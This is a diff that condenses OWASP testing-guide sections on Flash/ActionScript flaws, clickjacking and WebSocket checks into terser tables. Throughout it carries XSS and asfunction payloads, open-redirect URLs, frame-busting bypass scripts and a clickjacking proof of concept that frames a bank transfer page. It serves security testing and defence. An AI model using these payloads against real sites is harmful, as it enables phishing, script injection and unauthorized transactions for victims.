-ActionScript, based on ECMAScript, is the language used by Flash applications when dealing with interactive needs.
-There are three versions of the ActionScript language. ActionScript 1.0 and ActionScript 2.0 are very similar with
-ActionScript 2.0 being an extension of ActionScript 1.0. ActionScript 3.0, introduced with Flash Player 9, is a rewrite of
-the language to support object orientated design.
-ActionScript, like every other language, has some implementation patterns which could lead to security issues. In
-particular, since Flash applications are often embedded in browsers, vulnerabilities like DOM-based Cross Site
-Scripting (DOM XSS) could be present in flawed Flash applications.
-Cross-Site Flashing (XSF) is a vulnerability that has a similar impact to XSS.
-XSF occurs when the following scenarios are initiated from different domains:
-One movie loads another movie with loadMovie* functions (or other hacks) and has access to the same sandbox,
-or part of it.
-An HTML page uses JavaScript to command an Adobe Flash movie, for example, by calling:
-GetVariable to access Flash public and static objects from JavaScript as a string.
-SetVariable to set a static or public Flash object to a new string value with JavaScript.
+Goal: for legacy Flash/ActionScript content, find unsafe method calls or HTML-rendering TextFields that let an attacker-controlled FlashVar or cross-domain movie load lead to XSS, GUI spoofing, or open redirection.
 
-Unexpected communications between the browser and SWF application, which could result in stealing data from
-the SWF application.
-XSF may be performed by forcing a flawed SWF to load an external evil Flash file. This attack could result in XSS or in
-the modification of the GUI in order to fool a user to insert credentials on a fake Flash form. XSF could be used in the
-presence of Flash HTML Injection or external SWF files when loadMovie* methods are used.
+Cross-Site Flashing (XSF) parallels XSS: it occurs when a movie from one domain loads/controls a movie in another (sharing its sandbox), or when JavaScript and a SWF invoke each other's methods (`GetVariable`/`SetVariable`) across trust boundaries.
 
-Open Redirectors
-SWFs have the capability to navigate the browser. If the SWF takes the destination in as a FlashVar, then the SWF may
-be used as an open redirector. An open redirector is any piece of website functionality on a trusted website that an
-attacker can use to redirect the end user to a malicious website. These are frequently used within phishing attacks.
-Similar to cross-site scripting, the attack involves a user clicking on a malicious link.
-In the Flash case, the malicious URL might look like:
-
+**Open redirectors**: a SWF that takes a navigation target as a FlashVar can be abused as a phishing redirector, since the trusted domain's URL is what the victim sees:
+```
 http://trusted.example.org/trusted.swf?getURLValue=http://www.evil-spoofingwebsite.org/phishEndUsers.html
-
-In the above example, an end user might see that the URL begins with their favorite trusted website and click on it. The
-link would load the trusted SWF which takes the getURLValue and provides it to an ActionScript browser navigation
-call:
-
+```
+```actionscript
 getURL(_root.getURLValue,"_self");
+```
+Developers should only accept relative URLs, or verify the target domain/protocol before navigating.
 
-This would navigate the browser to the malicious URL provided by the attacker. At this point, the phisher has
-successfully leveraged the trust the user has in trusted.example.org to trick the user into visiting their malicious website.
-From there, they could launch a 0-day, conduct spoofing of the original website, or any other type of attack. SWFs may
-unintentionally be acting as an open-redirector on the website.
-Developers should avoid taking full URLs as FlashVars. If they only plan to navigate within their own website, then they
-should use relative URLs or verify that the URL begins with a trusted domain and protocol.
+**Flash Player version matters** — later releases progressively restricted these vectors:
 
-Attacks and Flash Player Version
-Since May 2007, three new versions of Flash Player were released by Adobe. Every new version restricts some of the
-attacks previously described.
-Player Version
+| Player version | `asfunction` | `ExternalInterface` | `GetURL` | HTML Injection |
+|---|---|---|---|---|
+| v9.0 r47/48 | Yes | Yes | Yes | Yes |
+| v9.0 r115 | No | Yes | Yes | Yes |
+| v9.0 r124 | No | Yes | Yes | Partially |
 
-asfunction
+**Decompilation**: SWF is interpreted, so it can be decompiled for white-box review — `flare hello.swf` produces `hello.flr` (ActionScript 2.0).
 
-ExternalInterface
+**FlashVars**: developer-intended inputs, passed via `<object>`/`<embed>` params or a query string (`file.swf?var1=val1`). In AS3 they must be explicitly read from `LoaderInfo(...).parameters`; in AS2, any undefined global (`_root.x`, `_global.x`, `_level0.x`) is implicitly overwritable by a URL param of the same name — a common source of injectable state, e.g. `_root.language` feeding an XML loader URL: `file.swf?language=http://evil.example.org/malicious.xml?`.
 
-GetURL
+Once a FlashVar/undefined global reaches one of these sinks, it's exploitable:
 
-HTML Injection
+| Sink | Vector |
+|---|---|
+| `loadVariables()`, `loadMovie()`, `loadMovieNum()`, `FScrollPane.loadScrollContent()`, `LoadVars.load`/`.send`, `XML.load()`, `Sound.loadSound()`, `NetStream.play()`, `htmlText` | unsafe method reachable since Player r47 — grep decompiled code for these |
+| `getURL()` (AS2) / `NavigateToURL` (AS3) | JS execution via `getURL(_root.URI,'_targetFrame')` ← `file.swf?URI=javascript:evilcode` |
+| `asfunction:` protocol | pre-r48 could target any URL-accepting method, post-r48 restricted to HTML TextFields — `asfunction:getURL,javascript:evilcode` wherever a URL param feeds e.g. `loadMovie(_root.URL)` |
+| `flash.external.ExternalInterface.call()` | abusable when part of its argument is attacker-controlled (`ExternalInterface.call(_root.callback)`) — browser-side call is effectively `eval('try { __flash__toXML('+__root.callback+') ; } catch...')` |
 
-v9.0 r47/48
-
-Yes
-
-Yes
-
-Yes
-
-Yes
-
-v9.0 r115
-
-No
-
-Yes
-
-Yes
-
-Yes
-
-v9.0 r124
-
-No
-
-Yes
-
-Yes
-
-Partially
-
-Test Objectives
-Decompile and analyze the application's code.
-Assess sinks inputs and unsafe method usages.
-
-How to Test
-Since the first publication of Testing Flash Applications, new versions of Flash Player were released in order to mitigate
-some of the attacks which will be described. Nevertheless, some issues still remain exploitable because they are the
-result of insecure programming practices.
-
-Decompilation
-Since SWF files are interpreted by a virtual machine embedded in the player itself, they can be potentially decompiled
-and analyzed. The most known and free ActionScript 2.0 decompiler is flare.
-To decompile a SWF file with flare just type:
-$ flare hello.swf
-
-This results in a new file called hello.flr.
-Decompilation helps testers because it allows for white-box testing of the Flash applications. A quick web search can
-lead you to various disassmeblers and flash security tools.
-
-Undefined Variables FlashVars
-FlashVars are the variables that the SWF developer planned on receiving from the web page. FlashVars are typically
-passed in from the Object or Embed tag within the HTML. For instance:
-
-<object width="550" height="400" classid="clsidd27cdb6e-ae6d-11cf-96b8-444553540000"
-codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0">
-<param name="movie" value="somefilename.swf">
-<param name="FlashVars" value="var1=val1&var2=val2">
-<embed src="somefilename.swf" width="550" height="400" FlashVars="var1=val1&var2=val2">
-</embed>
-</object>
-
-FlashVars can also be initialized from the URL:
-
-http://www.example.org/somefilename.swf?var1=val1&var2=val2
-
-In ActionScript 3.0, a developer must explicitly assign the FlashVar values to local variables. Typically, this looks like:
-
-var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;
-var var1:String = String(paramObj["var1"]);
-var var2:String = String(paramObj["var2"]);
-
-In ActionScript 2.0, any uninitialized global variable is assumed to be a FlashVar. Global variables are those variables
-that are prepended by _root , _global or _level0 . This means that if an attribute like _root.varname is undefined
-throughout the code flow, it could be overwritten by URL parameters:
-http://victim/file.swf?varname=value
-
-Regardless of whether you are looking at ActionScript 2.0 or ActionScript 3.0, FlashVars can be a vector of attack. Let's
-look at some ActionScript 2.0 code that is vulnerable:
-Example:
-
-movieClip 328 __Packages.Locale {
-#initclip
-if (!_global.Locale) {
-var v1 = function (on_load) {
-var v5 = new XML();
-var v6 = this;
-v5.onLoad = function (success) {
-if (success) {
-trace('Locale loaded xml');
-var v3 = this.xliff.file.body.$trans_unit;
-var v2 = 0;
-while (v2 < v3.length) {
-Locale.strings[v3[v2]._resname] = v3[v2].source.__text;
-++v2;
-}
-on_load();
-} else {}
-};
-if (_root.language != undefined) {
-Locale.DEFAULT_LANG = _root.language;
-}
-v5.load(Locale.DEFAULT_LANG + '/player_' +
-Locale.DEFAULT_LANG + '.xml');
-};
-
-The above code could be attacked by requesting:
-http://victim/file.swf?language=http://evil.example.org/malicious.xml?
-
-Unsafe Methods
-When an entry point is identified, the data it represents could be used by unsafe methods. If the data is not filtered or
-validated, it could lead to some vulnerabilities.
-Unsafe Methods since version r47 are:
-loadVariables()
-loadMovie()
-getURL()
-
-loadMovie()
-loadMovieNum()
-FScrollPane.loadScrollContent()
-LoadVars.load
-LoadVars.send
-XML.load ( 'url' )
-LoadVars.load ( 'url' )
-Sound.loadSound( 'url' , isStreaming );
-NetStream.play( 'url' );
-flash.external.ExternalInterface.call(_root.callback)
-htmlText
-
-Exploitation by Reflected XSS
-The swf file should be hosted on the victim's host, and the techniques of reflected XSS must be used. An attacker forces
-the browser to load a pure swf file directly in the location bar (by redirection or social engineering) or by loading it
-through an iframe from an evil page:
-
-<iframe src='http://victim/path/to/file.swf'></iframe>
-
-In this situation, the browser will self-generate an HTML page as if it were hosted by the victim host.
-
-GetURL (AS2) / NavigateToURL (AS3)
-The GetURL function in ActionScript 2.0 and NavigateToURL in ActionScript 3.0 lets the movie load a URI into the
-browser's window. If an undefined variable is used as the first argument for getURL:
-getURL(_root.URI,'_targetFrame');
-
-Or if a FlashVar is used as the parameter that is passed to a navigateToURL function:
-
-var request:URLRequest = new URLRequest(FlashVarSuppliedURL);
-navigateToURL(request);
-
-Then this will mean it's possible to call JavaScript in the same domain where the movie is hosted by requesting:
-http://victim/file.swf?URI=javascript:evilcode
-getURL('javascript:evilcode','_self');
-
-The same is possible when only some part of getURL is controlled via DOM injection with Flash JavaScript injection:
-
-getUrl('javascript:function('+_root.arg+')')
-
-Using `asfunction`
-You can use the special asfunction protocol to cause the link to execute an ActionScript function in a SWF file instead
-of opening a URL. Until release Flash Player 9 r48 asfunction could be used on every method which has a URL as
-an argument. After that release, asfunction was restricted to use within an HTML TextField.
-This means that a tester could try to inject:
-
-asfunction:getURL,javascript:evilcode
-
-in every unsafe method, such as:
-
-loadMovie(_root.URL)
-
-by requesting:
-http://victim/file.swf?URL=asfunction:getURL,javascript:evilcode
-
-ExternalInterface
-ExternalInterface.call is a static method introduced by Adobe to improve player/browser interaction for both
-
-ActionScript 2.0 and ActionScript 3.0.
-From a security point of view it could be abused when part of its argument could be controlled:
-
-flash.external.ExternalInterface.call(_root.callback);
-
-the attack pattern for this kind of flaw may be something like the following:
-
-eval(evilcode)
-
-since the internal JavaScript that is executed by the browser will be something similar to:
-
-eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "<undefined/>"; }')
-
-HTML Injection
-TextField Objects can render minimal HTML by setting:
-
-tf.html = true
-tf.htmlText = '<tag>text</tag>'
-
-So if some part of text could be controlled by the tester, an <a> tag or an image tag could be injected resulting in
-modifying the GUI or a XSS attack on the browser.
-Some attack examples with <a> tag:
-Direct XSS: <a href='javascript:alert(123)'>
-Call a function: <a href='asfunction:function,arg'>
-Call SWF public functions: <a href='asfunction:_root.obj.function, arg'>
-Call native static as function: <a href='asfunction:System.Security.allowDomain,evilhost'>
-An image tag could be used as well:
-
+**HTML Injection in TextFields** — setting `tf.html = true; tf.htmlText = '<tag>text</tag>'` with attacker-controlled content allows injecting `<a>`/`<img>` tags:
+```
+<a href='javascript:alert(123)'>                              (direct XSS)
+<a href='asfunction:function,arg'>                             (call a function)
+<a href='asfunction:_root.obj.function,arg'>                   (call SWF public function)
+<a href='asfunction:System.Security.allowDomain,evilhost'>     (call native static)
 <img src='http://evil/evil.swf'>
+<img src='javascript:evilcode//.swf'>                          (.swf suffix bypasses Flash's internal filter)
+```
+XSS via this vector was closed in Player 9.0.124.0, though GUI spoofing can still work.
 
-In this example, .swf is necessary to bypass the Flash Player internal filter:
-
-<img src='javascript:evilcode//.swf'>
-
-Since the release of Flash Player 9.0.124.0, XSS is no longer exploitable, but GUI modification could still be
-accomplished.
-The following tools may be helpful in working with SWF:
-Adobe SWF Investigator
-OWASP SWFIntruder
-Decompiler - Flare
-Disassembler - Flasm
-Swfmill - Convert Swf to XML and vice versa
+Tools: Adobe SWF Investigator, OWASP SWFIntruder, Flare (decompiler), Flasm (disassembler), Swfmill.
 
 ---
 
@@ -942,413 +354,60 @@ Swfmill - Convert Swf to XML and vice versa
 
 **Testing for Clickjacking**
 
-Summary
-Clickjacking, a subset of UI redressing, is a malicious technique whereby a web user is deceived into interacting (in
-most cases by clicking) with something other than what the user believes they are interacting with. This type of attack,
-either alone or in conjunction with other attacks, could potentially send unauthorized commands or reveal confidential
-information while the victim is interacting with seemingly-harmless web pages. The term clickjacking was coined by
-Jeremiah Grossman and Robert Hansen in 2008.
-A clickjacking attack uses seemingly-harmless features of HTML and JavaScript to force the victim to perform undesired
-actions, such as clicking an invisible button that performs an unintended operation. This is a client-side security issue
-that affects a variety of browsers and platforms.
-To carry out this attack, an attacker creates a seemingly-harmless web page that loads the target application through
-the use of an inline frame (concealed with CSS code). Once this is done, an attacker may induce the victim to interact
-with the web page by other means (through, for example, social engineering). Like other attacks, a common
-prerequisite is that the victim is authenticated against the attacker's target website.
+Goal: confirm the target page cannot be framed by an attacker-controlled page in a way that tricks the user into clicking on a hidden/disguised element — bypassing anti-CSRF protections since the click originates from the legitimate, authenticated page.
 
-Figure 4.11.9-1: Clickjacking inline frame illustration
+An attacker overlays/hides the target site in a transparent iframe beneath a decoy UI; the victim believes they're clicking the decoy but the click lands on the hidden authentic page.
 
-The victim surfs the attacker's web page with the intention of interacting with the visible user interface, but is
-inadvertently performing actions on the hidden page. Using the hidden page, an attacker can deceive users into
-performing actions they never intended to perform through the positioning of the hidden elements in the web page.
-
-Figure 4.11.9-2: Masked inline frame illustration
-
-The power of this method is that the actions performed by the victim are originated from the hidden but authentic target
-web page. Consequently, some of the anti-CSRF protections deployed by the developers to protect the web page from
-CSRF attacks could be bypassed.
-
-Test Objectives
-Understand security measures in place.
-Assess how strict the security measures are and if they are bypassable.
-
-How to Test
-As mentioned above, this type of attack is often designed to allow an attacker to induce users' actions on the target site,
-even if anti-CSRF tokens are being used. Testing should be conducted to determine if website pages are vulnerable to
-clickjacking attacks.
-Testers may investigate if a target page can be loaded in an inline frame by creating a simple web page that includes a
-frame containing the target web page. An example of HTML code to create this testing web page is displayed in the
-following snippet:
-
-<html>
-<head>
-<title>Clickjack test page</title>
-</head>
-<body>
-<iframe src="http://www.target.site" width="500" height="500"></iframe>
-</body>
+Black-box test: try to frame the target.
+```html
+<html><head><title>Clickjack test page</title></head>
+<body><iframe src="http://www.target.site" width="500" height="500"></iframe></body>
 </html>
+```
+If it loads, there's no clickjacking protection.
 
-If the http://www.target.site page is successfully loaded into the frame, then the site is vulnerable and has no type
-of protection against clickjacking attacks.
+**Bypassing protections** (if framing is initially blocked, these techniques may still defeat it):
 
-Bypass Clickjacking Protection
-If the http://www.target.site page does not appear in the inline frame, the site probably has some form of protection
-against clickjacking. It's important to note that this isn't a guarantee that the page is totally immune to clickjacking.
-Methods to protect a web page from clickjacking can be divided into a few main mechanisms. It is possible to bypass
-these methods in some circumstances by employing specific workarounds. For further OWASP resources on
-clickjacking defense, see the OWASP Clickjacking Defense Cheat Sheet.
-Client-side Protection: Frame Busting
-The most common client-side method, that has been developed to protect a web page from clickjacking, is called
-Frame Busting and it consists of a script in each page that should not be framed. The aim of this technique is to prevent
-a site from functioning when it is loaded inside a frame.
-The structure of frame busting code typically consists of a "conditional statement" and a "counter-action" statement. For
-this type of protection, there are some work arounds that fall under the name of "Bust frame busting". Some of this
-techniques are browser-specific while others work across browsers.
-Mobile Website Version
+| Protection | Bypass |
+|---|---|
+| Frame-busting JS (`if(top!=self){top.location=self.location}`) | Double framing: nest the target in two frames — `parent.location` access becomes a cross-frame security violation, disabling the counter-action |
+| Frame-busting JS | Disable JavaScript in the frame: IE `security="restricted"` attribute, HTML5 `sandbox` attribute (Chrome/Safari), or `document.designMode` (Firefox/IE8) |
+| Frame-busting JS | `onbeforeunload` abuse: register a handler on the attacker's top page that either prompts the user to stay (defeating the bust) or auto-cancels navigation via a rapid-fire request to a `204 No Content` endpoint |
+| Frame-busting JS | XSS filter abuse: inject the start of the target's own frame-busting script into a request parameter so the browser's XSS filter (IE8, Chrome 4 XSSAuditor) disables it as a "detected" attack |
+| Frame-busting JS | Redefine `location` as a variable (IE7/8) or via `defineSetter` (Safari 4.0.4) so the busting code's read/navigate throws instead of executing |
+| `X-Frame-Options` header | Legacy browsers (pre-2009) ignore it entirely; a stripping proxy removes it in transit; easy to miss on mobile-specific page variants |
 
-Mobile versions of the website are usually smaller and faster than the desktop ones, and they have to be less complex
-than the main application. Mobile variants have often less protection since there is the wrong assumption that an
-attacker could not attack an application by the smart phone. This is fundamentally wrong, because an attacker can fake
-the real origin given by a web browser, such that a non-mobile victim may be able to visit an application made for
-mobile users. From this assumption follows that in some cases it is not necessary to use techniques to evade frame
-busting when there are unprotected alternatives, which allow the use of same attack vectors.
-Double Framing
-
-Some frame busting techniques try to break frame by assigning a value to the parent.location attribute in the
-"counter-action" statement.
-Such actions are, for example:
-self.parent.location = document.location
-parent.location.href = self.location
-parent.location = self.location
-
-This method works well until the target page is framed by a single page. However, if the attacker encloses the target
-web page in one frame which is nested in another one (a double frame), then trying to access to parent.location
-becomes a security violation in all popular browsers, due to the descendant frame navigation policy. This security
-violation disables the counter-action navigation.
-Target site frame busting code ( example.org ):
-
-if(top.location!=self.locaton) {
-parent.location = self.location;
-}
-
-Attacker's top frame ( fictitious2.html ):
-
+Double-framing example:
+```html
+<!-- Attacker's top frame (fictitious2.html) -->
 <iframe src="fictitious.html">
-
-Attacker's fictitious sub-frame ( fictitious.html ):
-
+<!-- fictitious.html -->
 <iframe src="http://example.org">
+```
 
-Disabling JavaScript
-
-Since these type of client-side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled
-or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism
-against clickjacking.
-There are three deactivation techniques that can be used with frames:
-Restricted frames with Internet Explorer: Starting from Internet Explorer 6, a frame can have the "security" attribute
-that, if it is set to the value "restricted", ensures that JavaScript code, ActiveX controls, and re-directs to other sites
-do not work in the frame.
-Example:
-
-<iframe src="http://example.org" security="restricted"></iframe>
-
-Sandbox attribute: with HTML5 there is a new attribute called "sandbox". It enables a set of restrictions on content
-loaded into the iframe. At this moment this attribute is only compatible with Chrome and Safari.
-Example:
-
-<iframe src="http://example.org" sandbox></iframe>
-
-Design mode: Paul Stone showed a security issue concerning the "designMode" that can be turned on in the
-framing page (via document.designMode), disabling JavaScript in top and sub-frame. The design mode is
-currently implemented in Firefox and IE8.
-OnBeforeUnload Event
-
-The onBeforeUnload event could be used to evade frame busting code. This event is called when the frame busting
-code wants to destroy the iframe by loading the URL in the whole web page and not only in the iframe. The handler
-function returns a string that is prompted to the user asking confirm if he wants to leave the page. When this string is
-displayed to the user is likely to cancel the navigation, defeating target's frame busting attempt.
-The attacker can use this attack by registering an unload event on the top page using the following example code:
-
-<h1>www.fictitious.site</h1>
-<script>
-window.onbeforeunload = function()
-{
-return " Do you want to leave fictitious.site?";
-}
-</script>
-<iframe src="http://example.org">
-
-The previous technique requires the user interaction but, the same result, can be achieved without prompting the user.
-To do this the attacker have to automatically cancel the incoming navigation request in an onBeforeUnload event
-handler by repeatedly submitting (for example every millisecond) a navigation request to a web page that responds
-with a "HTTP/1.1 204 No Content" header.
-Since with this response the browser will do nothing, the resulting of this operation is the flushing of the request
-pipeline, rendering the original frame busting attempt futile.
-
-Following an example code:
-204 page:
-
-<?php
-header("HTTP/1.1 204 No Content");
-?>
-
-Attacker's page:
-
+`onbeforeunload` bypass without user interaction:
+```php
+<?php header("HTTP/1.1 204 No Content"); ?>
+```
+```html
 <script>
 var prevent_bust = 0;
-window.onbeforeunload = function() {
-prevent_bust++;
-};
-setInterval(
-function() {
-if (prevent_bust > 0) {
-prevent_bust -= 2;
-window.top.location = "http://attacker.site/204.php";
-}
+window.onbeforeunload = function() { prevent_bust++; };
+setInterval(function() {
+  if (prevent_bust > 0) {
+    prevent_bust -= 2;
+    window.top.location = "http://attacker.site/204.php";
+  }
 }, 1);
 </script>
 <iframe src="http://example.org">
+```
 
-XSS Filter
+**Building a PoC**: a target site's multi-step flow (e.g. bank transfer: form → confirm → execute) is often anti-CSRF-protected only on the final step. If the confirm step accepts GET params and displays a submit button, an attacker frames just that step, pre-fills `account`/`amount` via the URL, and uses CSS `opacity:0` positioning to align an invisible submit button under a decoy "Click and go!" button — the click submits the transfer confirmation while looking harmless.
 
-Starting from Google Chrome 4.0 and from IE8 there were introduced XSS filters to protect users from reflected XSS
-attacks. Nava and Lindsay have observed that these kind of filters can be used to deactivate frame busting code by
-faking it as malicious code.
-IE8 XSS filter: this filter has visibility into all parameters of each request and response flowing through the web
-browser and it compares them to a set of regular expressions in order to look for reflected XSS attempts. When the
-filter identifies a possible XSS attacks; it disables all inline scripts within the page, including frame busting scripts
-(the same thing could be done with external scripts). For this reason an attacker could induce a false positive by
-inserting the beginning of the frame busting script into a request's parameters.
-Example: Target web page frame busting code:
+Remediation: send `X-Frame-Options: DENY` (or `SAMEORIGIN`); prefer CSP `frame-ancestors` as the modern replacement, which lacks the legacy-browser and proxy-stripping caveats above. See the OWASP Clickjacking Defense Cheat Sheet.
 
-<script>
-if ( top != self )
-{
-top.location=self.location;
-}
-</script>
-
-Attacker code:
-
-<iframe src="http://example.org/?param=<script>if">
-
-Chrome 4.0 XSSAuditor filter: It has a little different behaviour compared to IE8 XSS filter, in fact with this filter an
-attacker could deactivate a "script" by passing its code in a request parameter. This enables the framing page to
-specifically target a single snippet containing the frame busting code, leaving all the other codes intact.
-Example: Target web page frame busting code:
-
-<script>
-if ( top != self )
-{
-top.location=self.location;
-}
-</script>
-
-Attacker code:
-
-<iframe src="http://example.org/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D">
-
-Redefining Location
-
-For several browser the "document.location" variable is an immutable attribute. However, for some version of Internet
-Explorer and Safari, it is possible to redefine this attribute. This fact can be exploited to evade frame busting code.
-Redefining location in IE7 and IE8: it is possible to redefine "location" as it is illustrated in the following example.
-By defining "location" as a variable, any code that tries to read or to navigate by assigning "top.location" will fail
-due to a security violation and so the frame busting code is suspended.
-Example:
-
-<script>
-var location = "xyz";
-</script>
-<iframe src="http://example.org"></iframe>
-
-Redefining location in Safari 4.0.4: To bust frame busting code with "top.location" it is possible to bind "location" to
-a function via defineSetter (through window), so that an attempt to read or navigate to the "top.location" will fail.
-Example:
-
-<script>
-window.defineSetter("location" , function(){});
-</script>
-<iframe src="http://example.org"></iframe>
-
-Server-side Protection: X-Frame-Options
-An alternative approach to client-side frame busting code was implemented by Microsoft and it consists of an header
-based defense. This new "X-FRAME-OPTIONS" header is sent from the server on HTTP responses and is used to mark
-web pages that shouldn't be framed. This header can take the values DENY, SAMEORIGIN, ALLOW-FROM origin, or
-non-standard ALLOWALL. Recommended value is DENY.
-The "X-FRAME-OPTIONS" is a very good solution, and was adopted by major browser, but also for this technique there
-are some limitations that could lead in any case to exploit the clickjacking vulnerability.
-Browser Compatibility
-
-Since the "X-FRAME-OPTIONS" was introduced in 2009, this header is not compatible with old browser. So every user
-that doesn't have an updated browser could be victim of clickjacking attack.
-Browser
-
-Lowest version
-
-Internet Explorer
-
-8.0
-
-Firefox (Gecko)
-
-3.6.9 (1.9.2.9)
-
-Opera
-
-10.50
-
-Safari
-
-4.0
-
-Chrome
-
-4.1.249.1042
-
-Proxies
-
-Web proxies are known for adding and stripping headers. In the case in which a web proxy strips the "X-FRAMEOPTIONS" header then the site loses its framing protection.
-Mobile Website Version
-
-Also in this case, since the X-FRAME-OPTIONS has to be implemented in every page of the website, the developers may
-have not protected the mobile version of the website.
-
-Create a Proof of Concept
-Once we have discovered that the site we are testing is vulnerable to clickjacking attack, we can proceed with the
-development of a proof of concept (PoC) to demonstrate the vulnerability. It is important to note that, as mentioned
-previously, these attacks can be used in conjunction with other forms of attacks (for example CSRF attacks) and could
-lead to overcome anti-CSRF tokens. In this regard we can imagine that, for example, the example.org website allows
-to authenticated and authorized users to make a transfer of money to another account.
-Suppose that to execute the transfer the developers have planned three steps. In the first step the user fill a form with
-the destination account and the amount. In the second step, whenever the user submits the form, is presented a
-summary page asking the user confirmation (like the one presented in the following picture).
-
-Figure 4.11.9-3: Clickjacking Example Step 2
-
-Following a snippet of the code for the step 2:
-
-//generate random anti CSRF token
-$csrfToken = md5(uniqid(rand(), TRUE));
-//set the token as in the session data
-$_SESSION['antiCsrf'] = $csrfToken;
-//Transfer form with the hidden field
-$form = '
-<form name="transferForm" action="confirm.php" method="POST">
-<div class="box">
-<h1>BANK XYZ - Confirm Transfer</h1>
-<p>
-Do You want to confirm a transfer of <b>'. $_REQUEST['amount'] .' &euro;</b> to account:
-<b>'. $_REQUEST['account'] .'</b> ?
-</p>
-<label>
-<input type="hidden" name="amount" value="' . $_REQUEST['amount'] . '" />
-<input type="hidden" name="account" value="' . $_REQUEST['account'] . '" />
-<input type="hidden" name="antiCsrf" value="' . $csrfToken . '" />
-<input type="submit" class="button" value="Transfer Money" />
-</label>
-
-</div>
-</form>';
-
-In the last step are planned security controls and then, if all is ok, the transfer is done. In the following listing a snippet of
-code of the last step is presented:
-Note: in this example, for simplicity, there is no input sanitization, but it has no relevance to block this type of attack
-
-if( (!empty($_SESSION['antiCsrf'])) && (!empty($_POST['antiCsrf'])) )
-{
-// input logic and sanization checks
-// check the anti-CSRF token
-if(($_SESSION['antiCsrf'] == $_POST['antiCsrf']) {
-echo '<p> '. $_POST['amount'] .' &euro; successfully transferred to account: '.
-$_POST['account'] .' </p>';
-}
-} else {
-echo '<p>Transfer KO</p>';
-}
-
-As you can see the code is protected from CSRF attack both with a random token generated in the second step and
-accepting only variable passed via POST method. In this situation an attacker could forge a CSRF + Clickjacking attack
-to evade anti-CSRF protection and force a victim to do a money transfer without her consent.
-The target page for the attack is the second step of the money transfer procedure. Since the developers put the security
-controls only in the last step, thinking that this is secure enough, the attacker could pass the account and amount
-parameters via GET method.
-Note: there is an advanced clickjacking attack that permits to force users to fill a form, so also in the case in which
-is required to fill a form, the attack is feasible
-The attacker's page may look like a simple and harmless web page like the one presented below:
-
-Figure 4.11.9-4: Clickjacking Example Malicious Page 1
-
-But playing with the CSS opacity value we can see what is hidden under the seemingly innocuous web page.
-
-Figure 4.11.9-5: Clickjacking Example Malicious Page 2
-
-The clickjacking code to create this page is presented below:
-
-<html>
-<head>
-<title>Trusted web page</title>
-<style type="text/css"><!-*{
-margin:0;
-padding:0;
-}
-body {
-background:#ffffff;
-}
-.button
-{
-padding:5px;
-background:#6699CC;
-left:275px;
-width:120px;
-border: 1px solid #336699;
-}
-#content {
-width: 500px;
-height: 500px;
-margin-top: 150px ;
-margin-left: 500px;
-}
-#clickjacking
-{
-position: absolute;
-left: 172px;
-top: 60px;
-filter: alpha(opacity=0);
-opacity:0.0
-}
-//--></style>
-</head>
-<body>
-<div id="content">
-<h1>www.owasp.com</h1>
-
-<form action="http://www.owasp.com">
-<input type="submit" class="button" value="Click and go!">
-</form>
-</div>
-<iframe id="clickjacking"-src="http//localhost/csrf/transferphp?
-account=attacker&amount=10000"-width="500"-height="500"-scrolling="no"-frameborder="none">
-</iframe>
-</body>
-</html>
-
-With the help of CSS (note the #clickjacking block) we can mask and suitably position the iframe in such a way as to
-match the buttons. If the victim click on the button "Click and go!" the form is submitted and the transfer is completed.
-
-Figure 4.11.9-6: Clickjacking Example Malicious Page 3
-
-The example presented uses only basic clickjacking technique, but with advanced technique is possible to force user
-filling form with values defined by the attacker.
-
-References
-OWASP Clickjacking
-Wikipedia Clickjacking
-Context Information Security: "Next Generation Clickjacking"
-Gustav Rydstedt, Elie Bursztein, Dan Boneh, and Collin Jackson: "Busting Frame Busting: a Study of Clickjacking
-Vulnerabilities on Popular Sites"
-Paul Stone: "Next generation clickjacking"
+Refs: OWASP Clickjacking; Wikipedia Clickjacking; "Next Generation Clickjacking" (Context IS, Paul Stone); "Busting Frame Busting" (Rydstedt, Bursztein, Boneh, Jackson).
 
 ---
 
@@ -1356,91 +415,28 @@ Paul Stone: "Next generation clickjacking"
 
 **Testing WebSockets**
 
-Summary
-Traditionally, the HTTP protocol only allows one request/response per TCP connection. Asynchronous JavaScript and
-XML (AJAX) allows clients to send and receive data asynchronously (in the background without a page refresh) to the
-server, however, AJAX requires the client to initiate the requests and wait for the server responses (half-duplex).
-WebSockets allow the client or server to create a 'full-duplex' (two-way) communication channel, allowing the client
-and server to truly communicate asynchronously. WebSockets conduct their initial upgrade handshake over HTTP and
-from then on all communication is carried out over TCP channels by use of frames. For more, see the WebSocket
-Protocol.
+Goal: confirm the WebSocket handshake validates `Origin`, the channel is encrypted (`wss://`) when carrying sensitive data, and standard authentication/authorization/input-validation testing has been applied to WebSocket traffic just as it would to HTTP.
 
-Origin
-It is the server's responsibility to verify the Origin header in the initial HTTP WebSocket handshake. If the server does
-not validate the origin header in the initial WebSocket handshake, the WebSocket server may accept connections from
-any origin. This could allow attackers to communicate with the WebSocket server cross-domain allowing for CSRF-like
-issues. See also Top 10-2017 A5-Broken Access Control.
+WebSockets provide full-duplex client/server communication over a single TCP connection, upgraded from an initial HTTP handshake.
 
-Confidentiality and Integrity
-WebSockets can be used over unencrypted TCP or over encrypted TLS. To use unencrypted WebSockets the ws://
-URI scheme is used (default port 80), to use encrypted (TLS) WebSockets the wss:// URI scheme is used (default
-port 443). See also Top 10-2017 A3-Sensitive Data Exposure.
+| Concern | Detail |
+|---|---|
+| Origin validation | Server must validate the handshake's `Origin` header itself — if it doesn't, any origin can connect, enabling CSRF-like cross-domain abuse |
+| Confidentiality/integrity | `ws://` (port 80) is unencrypted; `wss://` (port 443, TLS) should be used for sensitive data |
+| Input sanitization | WebSocket payloads are as untrusted as any other client input — sanitize/encode as usual |
 
-Input Sanitization
-As with any data originating from untrusted sources, the data should be properly sanitized and encoded. See also Top
-10-2017 A1-Injection and Top 10-2017 A7-Cross-Site Scripting (XSS).
+Black-box:
+1. Detect usage — inspect client source for `ws://`/`wss://`, use Chrome DevTools Network panel or ZAP's WebSocket tab.
+2. Origin — connect with a standalone WebSocket client; if the connection succeeds, the server likely isn't checking `Origin`.
